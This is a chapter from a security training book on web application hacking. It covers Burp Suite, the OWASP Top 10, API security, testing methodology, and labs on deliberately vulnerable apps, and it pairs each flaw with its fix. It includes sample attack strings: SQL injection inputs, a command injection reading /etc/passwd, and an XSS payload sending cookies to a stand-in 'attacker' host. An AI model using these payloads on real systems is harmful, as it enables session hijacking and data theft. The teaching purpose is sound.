# Chapter 16 · Web Application Hacking

> **Why this chapter matters:** The web is the biggest attack surface on earth, and web application security is the single most employable offensive skill for a beginner — it underpins pentesting, bug bounty, and AppSec engineering. Nearly every company has web apps and APIs; nearly all of them have vulnerabilities. This chapter is hands-on and long because it's that important. You'll learn the OWASP Top 10 by *exploiting* each class in your lab, with Burp Suite — the tool you must master.

> **By the end of this chapter you will:** understand and exploit the major web vulnerability classes (broken access control, injection, XSS, SSRF, and more), use Burp Suite fluently, test APIs, and — because you understand the mechanism — explain the fix for each. This is a chapter to spend weeks on, not hours.

> ⚠️ Practice only against DVWA, Juice Shop, PortSwigger's Web Security Academy, or other authorized targets. Never against live sites without written permission (Chapter 3).

---

## 16.1 Prerequisites you already have

From earlier chapters: HTTP methods/status codes/headers/cookies (Chapter 7), sessions and access control (Chapter 12), crypto/JWT (Chapter 11), and the "encoding/context confusion" idea (Chapter 4) that underlies most injection. Web hacking is where all of that becomes concrete. If HTTP feels fuzzy, revisit Chapter 7 first — you can't attack a protocol you can't read.

---

## 16.2 Burp Suite: your primary weapon

**Burp Suite** is an intercepting proxy that sits between your browser and the target, letting you *see and modify* every request and response. Master it — it's non-negotiable for web work. The Community (free) edition covers everything in this chapter.

Core components:
- **Proxy** — intercept, view, and edit HTTP requests in flight. Configure your browser (or Burp's built-in browser) to route through it. This is how you tamper with parameters, headers, and cookies that the UI won't let you touch.
- **Repeater** — resend and tweak a single request repeatedly. Your main manual-testing tool: change one thing, see what changes. You'll live here.
- **Intruder** — automate sending many variations of a request (fuzzing parameters, brute-forcing, enumerating IDs for IDOR). Rate-limited in Community, still very usable.
- **Decoder / Inspector** — encode/decode (base64, URL, hex — Chapter 4) inline.
- **Target / Site map** — the app's structure as you discover it.

> **The mindset Burp teaches:** the browser is just one client. The *server* is the target, and it must never trust anything the client sends — parameters, cookies, headers, hidden fields, the `Origin`, the JWT claims. Every one of those is attacker-controlled. Burp makes that control visible and testable. Internalizing "the client is untrusted" is the core of web security, offense and defense.

---

## 16.3 The OWASP Top 10 (your syllabus)

The **OWASP Top 10** is the industry-standard list of the most critical web application security risks, updated periodically. Learn each *by exploiting it and then explaining the fix*. The current categories (grouped for teaching):

### A01 — Broken Access Control (the #1 risk)
Covered conceptually in Chapter 12; here you exploit it. The forms:
- **IDOR** — change `/api/orders/1001` to `/api/orders/1002` → read someone else's order. Test *every* object reference.
- **Missing function-level access control** — access `/admin/*` as a normal user because it's only hidden, not protected server-side.
- **Privilege escalation / parameter tampering** — add `role=admin` or `"isAdmin":true` to a request; change a `userId` in a JWT the server doesn't validate.
**Fix:** enforce authorization server-side, on every request, by the authenticated identity; deny by default; never trust client-supplied identity/role.

### A03 — Injection (SQLi, command, and friends)
The archetypal "context confusion" bug (Chapter 4): attacker data is interpreted as *code/commands*.
- **SQL injection (SQLi)** — user input concatenated into a SQL query. Input `' OR '1'='1` into a login bypasses it; `' UNION SELECT username, password FROM users--` dumps credentials. **Blind SQLi** infers data via true/false or timing when no output shows. `sqlmap` automates exploitation (understand it manually first).
  ```
  Vulnerable:  "SELECT * FROM users WHERE name = '" + input + "'"
  Attack input: ' OR 1=1 --      →  SELECT * FROM users WHERE name = '' OR 1=1 --'
  ```
  **Fix:** **parameterized queries / prepared statements** (the data can never be parsed as SQL), plus least-privilege DB accounts and input validation. Never build queries by string concatenation.
- **Command injection** — input passed to a shell (`ping ` + userinput → `; cat /etc/passwd`). **Fix:** avoid shelling out; use safe APIs; never pass user input to a shell.
- **Also:** NoSQL injection, LDAP injection, ORM injection, template injection (SSTI), XXE (XML External Entity). Same root idea, different interpreter.

### A07-related — Cross-Site Scripting (XSS)
Attacker injects JavaScript that runs in *another user's* browser in the context of the trusted site — stealing session cookies (Chapter 12), keylogging, defacing, performing actions as the victim.
- **Reflected XSS** — payload in a request is reflected into the response (`?search=<script>...`); delivered via a malicious link.
- **Stored XSS** — payload saved server-side (a comment, profile) and served to every viewer. The most dangerous — it hits all users.
- **DOM-based XSS** — the vulnerability is in client-side JavaScript handling of input, never touching the server.
  ```
  Payload:  <script>fetch('https://attacker/c?'+document.cookie)</script>
  ```
  **Fix:** **context-aware output encoding** (encode data for the HTML/JS/attribute context it lands in), a strong **Content Security Policy (CSP)**, `HttpOnly` cookies (so stolen cookies are harder), and framework auto-escaping. Input validation helps but output encoding is the real fix.

### A10 — Server-Side Request Forgery (SSRF)
The app fetches a URL supplied by the user, and the attacker points it at *internal* systems the server can reach but they can't — cloud metadata endpoints (a top cloud-breach vector — Chapter 26), internal admin panels, `localhost` services.
**Fix:** allowlist permitted destinations, block internal ranges and metadata IPs, don't let user input drive server-side fetches unchecked.

### The rest of the Top 10 (know and test each)
- **A02 Cryptographic Failures** — weak/missing encryption, the crypto misuse from Chapter 11 (plaintext passwords, disabled TLS validation, weak hashes).
- **A04 Insecure Design** — flaws in the design itself (missing threat modeling — Chapter 10). Not patchable; must be designed out.
- **A05 Security Misconfiguration** — default credentials, verbose errors, unnecessary features enabled, missing security headers, exposed admin interfaces. Extremely common.
- **A06 Vulnerable and Outdated Components** — using libraries/frameworks with known CVEs (Log4Shell was this). Ties to supply chain (Chapter 28).
- **A08 Software and Data Integrity Failures** — insecure deserialization, unsigned updates, CI/CD tampering.
- **A09 Security Logging and Monitoring Failures** — you can't respond to what you don't log (Part 4).
- **CSRF (Cross-Site Request Forgery)** — tricking a logged-in user's browser into making an unwanted authenticated request. **Fix:** anti-CSRF tokens, `SameSite` cookies (Chapter 12).

---

## 16.4 API security

Modern apps are mostly APIs (REST, GraphQL) behind the UI, and APIs have their own **OWASP API Security Top 10**. Key differences:
- **BOLA (Broken Object Level Authorization)** — IDOR for APIs; the #1 API risk. Same fix: per-object server-side authz.
- **BFLA (Broken Function Level Authorization)** — calling admin API functions as a regular user.
- **Mass assignment** — sending extra JSON fields the server blindly binds (`"isAdmin":true`).
- **Excessive data exposure** — APIs returning more data than the UI shows (the filtering was only client-side).
- **Rate limiting / resource consumption** — abuse and DoS.
- **GraphQL specifics** — introspection exposing the whole schema, nested-query DoS, authorization per-resolver.

Test APIs with Burp (they're just HTTP), plus tools like Postman. APIs are often *less* protected than the web UI because teams forget the API is directly reachable — a rich, in-demand testing area.

---

## 16.5 Methodology: how a web test actually flows

1. **Map the app** (Chapter 15 enumeration + Burp site map): every page, parameter, endpoint, cookie, and the tech stack.
2. **Understand the roles and workflows** — what should each user be able to do? (This defines what "broken access control" means here.)
3. **Test systematically** against each Top 10 class, per input and per endpoint — this is where thoroughness pays.
4. **Chain findings** — a low-severity info leak + an IDOR + weak session handling can combine into full account takeover. Chaining is what turns "medium" findings into "critical" impact and what distinguishes a real pentest from a scan.
5. **Document each finding** — request/response evidence, reproduction steps, impact, and remediation (Chapter 19).

**Automated scanners** (Burp Pro's scanner, OWASP ZAP) help with breadth, but the high-value findings — business logic flaws, access control, chained exploits — are manual. Use automation for coverage, brains for depth.

---

## Common mistakes

- **Not mastering Burp.** Everything else depends on being able to see and modify requests. Invest the time.
- **Testing the UI instead of the server.** The browser's restrictions are irrelevant — attack the server directly through Burp. Hidden/disabled ≠ protected.
- **Learning payloads without mechanisms.** `' OR 1=1--` is meaningless until you understand *why* it breaks the query. Understand the parsing, and you can adapt to any variant and explain the fix.
- **Only testing the "happy path" inputs.** Test every parameter, header, cookie, and hidden field — attacker-controlled means *all* of it.
- **Skipping the fix.** A finding you can't remediate is half a finding. Always know and state the correct defense — it's what makes you employable in AppSec.
- **Forgetting APIs.** The UI may be hardened while the API behind it is wide open.

---

## Labs

> **Lab 16.1 — Master Burp basics.** Set up Burp with your browser against DVWA. Intercept a request, send it to Repeater, modify a parameter, and observe the response. Send a request to Intruder and fuzz a parameter. Until this is comfortable, don't proceed — it's the foundation.

> **Lab 16.2 — Work the full OWASP Top 10 in DVWA.** DVWA has modules for SQLi, XSS (all types), command injection, CSRF, file inclusion, and more, at Low/Medium/High security levels. Exploit each at Low, then try Medium (which adds real-ish defenses to bypass). For each: document the exploit, the *why*, and the fix. This is a portfolio-grade writeup series.

> **Lab 16.3 — PortSwigger Web Security Academy.** This is the best web-hacking training in existence, and it's free. Complete the labs for: Access control (IDOR), SQL injection, XSS, CSRF, SSRF, authentication, and JWT. Aim for 40+ labs. Track your progress; this is résumé-worthy on its own.

> **Lab 16.4 — Hack Juice Shop.** OWASP Juice Shop is a realistic modern app with a built-in scoreboard of challenges. Work through the beginner and intermediate challenges. It's more realistic than DVWA (real framework, API-driven) and great chaining practice.

> **Lab 16.5 — API testing.** In Juice Shop or a lab API, find a BOLA/IDOR by manipulating object IDs in API calls, and a mass-assignment issue by adding an unexpected field. Document the API-specific angle.

> **Lab 16.6 — Automate a check.** Write a Python script (Chapter 8) that tests a parameter for reflected XSS or basic SQLi across a list of endpoints, using `requests`. Understand what Burp/ZAP automate by building a tiny version yourself.

---

## References and further reading

- **PortSwigger Web Security Academy** — [portswigger.net/web-security](https://portswigger.net/web-security). Free, world-class, hands-on, made by the Burp authors. **The single best resource for this chapter.** Do it thoroughly.
- **OWASP Top 10** — [owasp.org/Top10](https://owasp.org/www-project-top-ten/) — and the **OWASP API Security Top 10** and **OWASP Testing Guide** and **Cheat Sheet Series**. Primary references.
- **Michal Zalewski — *The Tangled Web*.** The deep "why the web is insecure by design" book. Foundational understanding.
- **Dafydd Stuttard & Marcus Pinto — *The Web Application Hacker's Handbook*.** The classic comprehensive text (by Burp's creators). Dense but definitive; some tooling is dated, methodology isn't.
- **HackTricks (web section)** — [book.hacktricks.xyz](https://book.hacktricks.xyz) — practical "how do I test/exploit X" reference during labs.
- **PayloadsAllTheThings** — [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — payload reference (understand them, don't just paste).
- **Bug bounty write-ups** (on Medium, HackerOne Hacktivity) — see real vulnerabilities in real apps, ethically disclosed.

---

## Self-check

1. Why is "the client is untrusted" the central principle of web security, and how does Burp embody it?
2. Explain why `' OR '1'='1` bypasses a vulnerable login, and state the correct fix (and why it works).
3. Distinguish reflected, stored, and DOM-based XSS, and name the real fix for XSS.
4. What is SSRF and why is it especially dangerous in cloud environments?
5. What is BOLA/IDOR, why is it the top API risk, and how do you remediate it?

<details>
<summary>Answers</summary>

1. Because everything the client sends — parameters, cookies, headers, hidden fields, JWT claims, the `Origin` — is fully attacker-controlled, so the server must independently validate and authorize every request rather than trusting the client's UI-level restrictions. Burp embodies it by letting you see and modify *any* request in flight, proving the browser's rules are irrelevant to an attacker.
2. In a vulnerable query like `... WHERE name='INPUT'`, the input `' OR '1'='1` closes the string and injects an always-true condition, so the WHERE clause matches every row (or the first user) and authentication passes. Fix: **parameterized queries/prepared statements**, which send the query structure and the data separately so user input is treated purely as data and can never be parsed as SQL.
3. **Reflected** — payload in the request is echoed into the immediate response (delivered via a crafted link). **Stored** — payload is saved server-side and served to every viewer (most dangerous). **DOM-based** — the flaw is in client-side JS handling input, never reaching the server. Real fix: **context-aware output encoding** (plus CSP and framework auto-escaping); input validation alone is insufficient.
4. Server-Side Request Forgery makes the server fetch an attacker-supplied URL, reaching internal systems the attacker can't directly access. In the cloud it's especially dangerous because it can hit the **instance metadata service** to steal cloud credentials/tokens, leading to environment compromise. Fix: allowlist destinations, block internal/metadata addresses.
5. Broken Object Level Authorization (the API form of IDOR): the API returns an object based on a client-supplied ID without verifying the caller owns it, so changing the ID exposes others' data. It's the top API risk because APIs expose many object references directly and per-object authorization is easy to forget. Remediate with **server-side, per-object authorization checks** tied to the authenticated identity on every request.

</details>

---

## What's next

You can break web apps — the most valuable beginner offensive skill. Now you go below the web to the hosts and networks beneath: getting a shell on a machine and escalating to full control. [Chapter 17](17-host-and-network-exploitation.md) covers exploitation, privilege escalation, and post-exploitation — turning a foothold into ownership.
